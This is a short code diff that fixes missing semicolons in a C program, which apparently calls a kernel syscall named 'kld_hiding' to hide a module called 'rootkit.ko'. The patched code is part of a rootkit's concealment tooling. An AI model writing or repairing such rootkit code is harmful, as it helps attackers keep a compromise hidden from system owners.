@@ -37,12 +37,12 @@ main(void)
     hide_module_syscall = find_syscall("sys/kld_hiding");
     
     if (hide_module_syscall == -1) {
-        perror("error")
+        perror("error");
         return 1;
     }
     
     if (syscall(hide_module_syscall, "rootkit.ko") == -1) {
-        perror("error")
+        perror("error");
         return 1;
     }
 
